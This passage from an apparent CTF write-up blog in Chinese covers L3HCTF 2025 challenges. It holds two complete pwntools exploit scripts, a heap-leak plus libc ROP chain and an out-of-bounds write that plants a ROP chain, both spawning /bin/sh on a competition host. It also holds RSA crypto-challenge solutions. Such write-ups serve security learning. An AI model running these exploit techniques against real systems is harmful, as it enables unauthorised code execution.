class="keyword">return</span> remote(*args.TAG.split(<span class="string">&#x27;:&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> args.REM:<span class="keyword">return</span> remote(*attack.split(<span class="string">&#x27;:&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> process([binary] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch=&#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)</span></span><br><span class="line">context(binary = binary, log_level = <span class="string">&#x27;debug&#x27;</span>,</span><br><span class="line">terminal=<span class="string">&#x27;tmux splitw -h -l 170&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>))</span><br><span class="line">libc = context.binary.libc</span><br><span class="line"><span class="comment">#elf  = ELF(binary)</span></span><br><span class="line"><span class="comment">#print(context.binary.libs)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#import socks</span></span><br><span class="line"><span class="comment">#context.proxy = (socks.SOCKS5, &#x27;192.168.31.251&#x27;, 10808)</span></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">brva 0x01A0D</span></span><br><span class="line"><span class="string">brva 0x1A1F</span></span><br><span class="line"><span class="string">brva 0x01828</span></span><br><span class="line"><span class="string">#continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"><span class="comment">#import os</span></span><br><span class="line"><span class="comment">#os.systimport os</span></span><br><span class="line"><span class="comment">#io = remote(*attack.split(&#x27;:&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">note_system</span>():</span><br><span class="line">    ru(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,text</span>):</span><br><span class="line">    ru(<span class="string">&#x27;Choose an option: &#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;): &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&#x27;size (1-2048): &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(size))&gt;=<span class="number">4</span>:</span><br><span class="line">        s(<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sl(<span class="built_in">str</span>(size))</span><br><span class="line">    ru(<span class="string">&#x27;ontent: &#x27;</span>)</span><br><span class="line">    s(text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rm</span>(<span class="params">idx</span>):</span><br><span class="line">    ru(<span class="string">&#x27;Choose an option: &#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    ru(<span class="string">&#x27;Choose an option: &#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&#x27;---\n&#x27;</span>)</span><br><span class="line">io = start([])</span><br><span class="line"></span><br><span class="line">note_system()</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x5f7</span>,<span class="string">&#x27;H&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x17</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x17</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">rm(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x567</span>,<span class="string">&#x27;E&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;Choose an option: &#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;shout:&#x27;</span>)</span><br><span class="line">pay = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x23</span></span><br><span class="line">pay += p8(<span class="number">0x37</span>)</span><br><span class="line">pay += p8(<span class="number">0x6a</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,gdbscript=gdbscript)</span></span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line">note_system()</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_addr =  uu64(r(<span class="number">6</span>))</span><br><span class="line">lss(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x600</span>,<span class="string">&#x27;hehe&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x600</span>,<span class="string">&#x27;hehe&#x27;</span>)</span><br><span class="line">rm(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">pay = p64(heap_addr+<span class="number">0x10</span>) + p64(heap_addr-<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x17</span>,pay)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base =  uu64(r(<span class="number">6</span>)) - <span class="number">0x203f90</span></span><br><span class="line">lss(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">rm(<span class="number">1</span>)</span><br><span class="line">libc.address = libc_base</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">poprdi = <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi;ret&#x27;</span>)))</span><br><span class="line">poprsi = <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi;ret&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x17</span>,p64(<span class="number">0x414243</span>)+p64(libc_base + <span class="number">0x2a871</span>)) <span class="comment"># pop </span></span><br><span class="line"></span><br><span class="line">rop  = p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(poprdi)</span><br><span class="line">rop += p64(bin_sh)</span><br><span class="line">rop += p64(poprsi)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(<span class="number">0x00000000000b503c</span> + libc_base) <span class="comment"># pop rdx</span></span><br><span class="line">rop += p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;execve&#x27;</span>])</span><br><span class="line">add(<span class="number">0xf</span>,<span class="number">0x600</span>,rop)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pay = b&#x27;ABC&#x27;</span></span><br><span class="line"><span class="comment">#add(7,0x40,pay)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ru(&#x27;Choose an option: &#x27;)</span></span><br><span class="line"><span class="comment">#sl(&#x27;4&#x27;)</span></span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2><span id="library">Library</span><a href="#library" class="header-anchor"></a></h2><p>漏洞在功能3，没有限制 page 的索引，可以任意偏移写</p>
<p><img src="../images/2025-L3HCTF/d7301785-2a38-426f-a78d-fc411ce3be78.png" alt="img"></p>
<p>本地测试发现 编辑写入的数据所在的段有两种情况，在heap 下面的时候， 他会和其他线程的stack 地址有固定偏移</p>
<p><img src="../images/2025-L3HCTF/e70cbba8-2e31-413e-89a9-00a9342f6c42.png" alt="img"></p>
<p><img src="../images/2025-L3HCTF/711fc631-ad5b-42e9-b0cc-837a046e84d1.png" alt="img"></p>
<p><img src="../images/2025-L3HCTF/dec030ad-b986-482e-86f3-aa899ffd8cfa.png" alt="img"></p>
<p>后面直接写rop 就行了，elf 里面gadget 足够用了，还有 syscall</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import CDLL</span></span><br><span class="line"><span class="comment">#cdl = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">s    = <span class="keyword">lambda</span>   x : io.send(x)</span><br><span class="line">sa   = <span class="keyword">lambda</span> x,y : io.sendafter(x,y)</span><br><span class="line">sl   = <span class="keyword">lambda</span>   x : io.sendline(x)</span><br><span class="line">sla  = <span class="keyword">lambda</span> x,y : io.sendlineafter(x,y)</span><br><span class="line">r    = <span class="keyword">lambda</span> x   : io.recv(x)</span><br><span class="line">ru   = <span class="keyword">lambda</span> x   : io.recvuntil(x)</span><br><span class="line">rl   = <span class="keyword">lambda</span>     : io.recvline()</span><br><span class="line">itr  = <span class="keyword">lambda</span>     : io.interactive()</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ls   = <span class="keyword">lambda</span> x   : log.success(x)</span><br><span class="line">lss  = <span class="keyword">lambda</span> x   : ls(<span class="string">&#x27;\033[1;31;40m%s -&gt; 0x%x \033[0m&#x27;</span> % (x, <span class="built_in">eval</span>(x)))</span><br><span class="line"></span><br><span class="line">attack = <span class="string">&#x27;1.95.8.146:25314&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">binary = <span class="string">&#x27;./library.kexe&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:<span class="keyword">return</span> gdb.debug(binary,gdbscript)</span><br><span class="line">    <span class="keyword">if</span> args.TAG:<span class="keyword">return</span> remote(*args.TAG.split(<span class="string">&#x27;:&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> args.REM:<span class="keyword">return</span> remote(*attack.split(<span class="string">&#x27;:&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> process([binary] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch=&#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)</span></span><br><span class="line">context(binary = binary, log_level = <span class="string">&#x27;debug&#x27;</span>,</span><br><span class="line">terminal=<span class="string">&#x27;tmux splitw -h -l 170&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>))</span><br><span class="line"><span class="comment">#libc = context.binary.libc</span></span><br><span class="line"><span class="comment">#elf  = ELF(binary)</span></span><br><span class="line"><span class="comment">#print(context.binary.libs)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#import socks</span></span><br><span class="line"><span class="comment">#context.proxy = (socks.SOCKS5, &#x27;192.168.31.251&#x27;, 10808)</span></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *0x23d8a2</span></span><br><span class="line"><span class="string">b *0x0252416</span></span><br><span class="line"><span class="string">#continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"><span class="comment">#import os</span></span><br><span class="line"><span class="comment">#os.systimport os</span></span><br><span class="line"><span class="comment">#io = remote(*attack.split(&#x27;:&#x27;))</span></span><br><span class="line">io = start([])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name</span>):</span><br><span class="line">    ru(<span class="string">&#x27;Your choice: \n&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;borrow?\n&#x27;</span>)</span><br><span class="line">    sl(name)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,page,text</span>):</span><br><span class="line">    ru(<span class="string">&#x27;Your choice: \n&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;read?\n&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&#x27;page: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(page))</span><br><span class="line">    ru(<span class="string">&#x27;write: &#x27;</span>)</span><br><span class="line">    s(text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;hack1&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;BBBBBBB&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io,gdbscript)</span></span><br><span class="line">rax = <span class="number">0x000000000024600f</span> <span class="comment"># pop rax ; ret</span></span><br><span class="line">rdi = <span class="number">0x0000000000227871</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">rsi = <span class="number">0x000000000022727d</span> <span class="comment"># pop rsi ; ret</span></span><br><span class="line">rdx = <span class="number">0x00000000002539c4</span> <span class="comment"># pop rdx ; ret</span></span><br><span class="line">mov_rsi_rdx = <span class="number">0x0000000000252d4c</span> <span class="comment"># mov qword ptr [rsi], rdx ; ret</span></span><br><span class="line">syscall =  <span class="number">0x25FC90</span></span><br><span class="line">pay  = [</span><br><span class="line">    rdx,<span class="number">0x68732f6e69622f</span>,</span><br><span class="line">    rsi,<span class="number">0x26e7b8</span>,</span><br><span class="line">    mov_rsi_rdx,</span><br><span class="line">    rdi,<span class="number">0x3b</span>,</span><br><span class="line">    rsi,<span class="number">0x26e7b8</span>,</span><br><span class="line">    rdx,<span class="number">0</span>,</span><br><span class="line">    syscall,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pay)):</span><br><span class="line">    edit(<span class="number">0</span>,<span class="number">0x218198</span>+i,p64(pay[i]))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<p><img src="../images/2025-L3HCTF/8564e85a-08de-48c4-bf7a-6e49ce112132.png" alt="img"></p>
<h1><span id="crypto">Crypto</span><a href="#crypto" class="header-anchor"></a></h1><h2><span id="math-problem">math_problem</span><a href="#math-problem" class="header-anchor"></a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2  </span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint  </span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert  </span><br><span class="line"><span class="keyword">from</span> scret <span class="keyword">import</span> flag  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myfunction</span>(<span class="params">num</span>):  </span><br><span class="line">    output = <span class="number">0</span>  </span><br><span class="line">    output=num**<span class="number">3</span>  </span><br><span class="line">    <span class="keyword">return</span> output  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    flag_len = <span class="built_in">len</span>(flag)  </span><br><span class="line">    p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">        r = getPrime(<span class="number">512</span>)  </span><br><span class="line">        R = bytes_to_long(<span class="built_in">str</span>(r).encode())  </span><br><span class="line">        <span class="keyword">if</span> isPrime(R):  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">  </span><br><span class="line">    n = p * q * r  </span><br><span class="line">    hint1 = R * r  </span><br><span class="line">    mod = myfunction(n)  </span><br><span class="line">    hint2 = <span class="built_in">pow</span>(<span class="number">3</span>*n+<span class="number">1</span>, p % (<span class="number">2</span> ** <span class="number">400</span>), mod)  </span><br><span class="line">    m = bytes_to_long(flag)  </span><br><span class="line">    c = <span class="built_in">pow</span>(m, <span class="number">65537</span>, n)  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;All data:&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;hint1 = <span class="subst">&#123;hint1&#125;</span>&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;hint2 = <span class="subst">&#123;hint2&#125;</span>&#x27;</span>)  </span><br></pre></td></tr></table></figure>

<p>给出的数据有 $n&#x3D;pqr$，$hint_1&#x3D;R \cdot r$，$hint_2 \equiv (3n+1)^{p\bmod{2^{400}}} \pmod{n^3}$，显然有 $gcd(n,hint_1)&#x3D;r$，猜测flag不大的情况下直接在模 $n$ 下就能解出flag：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line">n = <span class="number">1031361339208727791691298627543660626410606240120564103678654539403400080866317968868129842196968695881908504164493307869679126969820723174066217814377008485456923379924853652121682069359767219423414060835725846413022799109637665041081215491777412523849107017649039242068964400703052356256244423474207673552341406331476528847104738461329766566162770505123490007005634713729116037657261941371410447717090137275138353217951485412890440960756321099770208574858093921</span></span><br><span class="line">c = <span class="number">102236458296005878146044806702966879940747405722298512433320216536239393890381990624291341014929382445849345903174490221598574856359809965659167404530660264493014761156245994411400111564065685663103513911577275735398329066710295262831185375333970116921093419001584290401132157702732101670324984662104398372071827999099732380917953008348751083912048254277463410132465011554297806390512318512896160903564287060978724650580695287391837481366347198300815022619675984</span></span><br><span class="line">hint1 = <span class="number">41699797470148528118065605288197366862071963783170462567646805693192170424753713903885385414542846725515351517470807154959539734665451498128021839987009088359453952505767502787767811244460427708303466073939179073677508236152266192609771866449943129677399293427414429298810647511172104050713783858789512441818844085646242722591714271359623474775510189704720357600842458800685062043578453094042903696357669390327924676743287819794284636630926065882392099206000580093201362555407712118431477329843371699667742798025599077898845333</span></span><br><span class="line">hint2 = <span class="number">10565371682545827068628214330168936678432017129758459192768614958768416450293677581352009816968059122180962364167183380897064080110800683719854438826424680653506645748730410281261164772551926020079613841220031841169753076600288062149920421974462095373140575810644453412962829711044354434460214948130078789634468559296648856777594230611436313326135647906667484971720387096683685835063221395189609633921668472719627163647225857737284122295085955645299384331967103814148801560724293703790396208078532008033853743619829338796313296528242521122038216263850878753284443416054923259279068894310509509537975210875344702115518307484576582043341455081343814378133782821979252975223992920160189207341869819491668768770230707076868854748648405256689895041414944466320313193195829115278252603228975429163616907186455903997049788262936239949070310119041141829846270634673190618136793047062531806082102640644325030011059428082270352824026797462398349982925951981419189268790800571889709446027925165953065407940787203142846496246938799390975110032101769845148364390897424165932568423505644878118670783346937251004620653142783361686327652304482423795489977844150385264586056799848907</span></span><br><span class="line"></span><br><span class="line">r = gcd(n, hint1)</span><br><span class="line">d = inverse(<span class="number">65537</span>, r-<span class="number">1</span>)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, r)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<p>对于 $\text{hint}_1$，设 $p_l \equiv p \pmod{2^{400}}$，那么通过二项式定理展开整理可以得到：</p>
<p>$\text{hint}_2 \equiv 1 + p_l \cdot 3n + \frac{p_l(p_l-1)}{2}(3n)^2 \pmod{n^3}$</p>
<p>模 $n^2$ 可以更进一步得到：</p>
<p>$\text{hint}_2 \equiv 1 + p_l \cdot 3n \pmod{n^2}$</p>
<p>显然的，$p_l \cdot 3n + 1 &#x3D; \text{hint}_2 \bmod n^2$，也就是说我们可以通过下式直接得到 $p$ 的低400位 $p_l$：</p>
<p>$p_l &#x3D; \frac{\text{hint}_2 \bmod n^2 - 1}{3n}$</p>
<p>通过 Coppersmith 就可以还原出完整的 $p$ 了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">1031361339208727791691298627543660626410606240120564103678654539403400080866317968868129842196968695881908504164493307869679126969820723174066217814377008485456923379924853652121682069359767219423414060835725846413022799109637665041081215491777412523849107017649039242068964400703052356256244423474207673552341406331476528847104738461329766566162770505123490007005634713729116037657261941371410447717090137275138353217951485412890440960756321099770208574858093921</span></span><br><span class="line">c = <span class="number">102236458296005878146044806702966879940747405722298512433320216536239393890381990624291341014929382445849345903174490221598574856359809965659167404530660264493014761156245994411400111564065685663103513911577275735398329066710295262831185375333970116921093419001584290401132157702732101670324984662104398372071827999099732380917953008348751083912048254277463410132465011554297806390512318512896160903564287060978724650580695287391837481366347198300815022619675984</span></span><br><span class="line">hint1 = <span class="number">41699797470148528118065605288197366862071963783170462567646805693192170424753713903885385414542846725515351517470807154959539734665451498128021839987009088359453952505767502787767811244460427708303466073939179073677508236152266192609771866449943129677399293427414429298810647511172104050713783858789512441818844085646242722591714271359623474775510189704720357600842458800685062043578453094042903696357669390327924676743287819794284636630926065882392099206000580093201362555407712118431477329843371699667742798025599077898845333</span></span><br><span class="line">hint2 = <span class="number">10565371682545827068628214330168936678432017129758459192768614958768416450293677581352009816968059122180962364167183380897064080110800683719854438826424680653506645748730410281261164772551926020079613841220031841169753076600288062149920421974462095373140575810644453412962829711044354434460214948130078789634468559296648856777594230611436313326135647906667484971720387096683685835063221395189609633921668472719627163647225857737284122295085955645299384331967103814148801560724293703790396208078532008033853743619829338796313296528242521122038216263850878753284443416054923259279068894310509509537975210875344702115518307484576582043341455081343814378133782821979252975223992920160189207341869819491668768770230707076868854748648405256689895041414944466320313193195829115278252603228975429163616907186455903997049788262936239949070310119041141829846270634673190618136793047062531806082102640644325030011059428082270352824026797462398349982925951981419189268790800571889709446027925165953065407940787203142846496246938799390975110032101769845148364390897424165932568423505644878118670783346937251004620653142783361686327652304482423795489977844150385264586056799848907</span></span><br><span class="line"></span><br><span class="line">r = GCD(n, hint1)</span><br><span class="line">pl = (hint2 % (n^<span class="number">2</span>) - <span class="number">1</span>) // (<span class="number">3</span> * n)</span><br><span class="line">R.&lt;x&gt; = Zmod(n//r)[]</span><br><span class="line">f = x * <span class="number">2</span>^<span class="number">400</span> + pl</span><br><span class="line">f = f.monic()</span><br><span class="line"></span><br><span class="line">ph = f.small_roots(X=<span class="number">2</span>^<span class="number">112</span>, beta=<span class="number">0.4</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">p = ZZ(ph * <span class="number">2</span>^<span class="number">400</span> + pl)</span><br><span class="line">q = n // (p * r)</span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>) * (r - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = inverse(<span class="number">65537</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<h2><span id="rrrsssaaa">RRRSSSAAA</span><a href="#rrrsssaaa" class="header-anchor"></a></h2><p>为了解密给定的密文，我们需要从公钥中恢复私钥。公钥包括模数 N 和指数 e，其中 e是通过一个自定义过程生成的。分析发现，私钥指数 $d$ 可以表示为 $d&#x3D;\phi-d_{small}$，其中 $\phi&#x3D;(p^4-1)(q^4-1)$，且 $d_{small}$ 是一个 1021 位的小整数。通过连分数方法，可以从 e 和 $N^4$ 的比值中恢复 $d_{small}$。然后，解密过程简化为计算 $c^{-d_{small}} \bmod N$。</p>
<p>所以首先计算 $N^4$，然后对有理数 $e&#x2F;N^4$ 进行连分数展开，并遍历其渐近分数。对于每个渐近分数，检查分母的位长度是否为 1021 位（即 $2^{1020} \leq 分母 &lt; 2^{1021}$），随后对每个候选 $d_{small}$，尝试解密。</p>
<p>计算 $c$ 在模 $N$ 下的逆元，将 $m$ 转换为字节序列，检查是否包含 “L3H”的内容。</p>
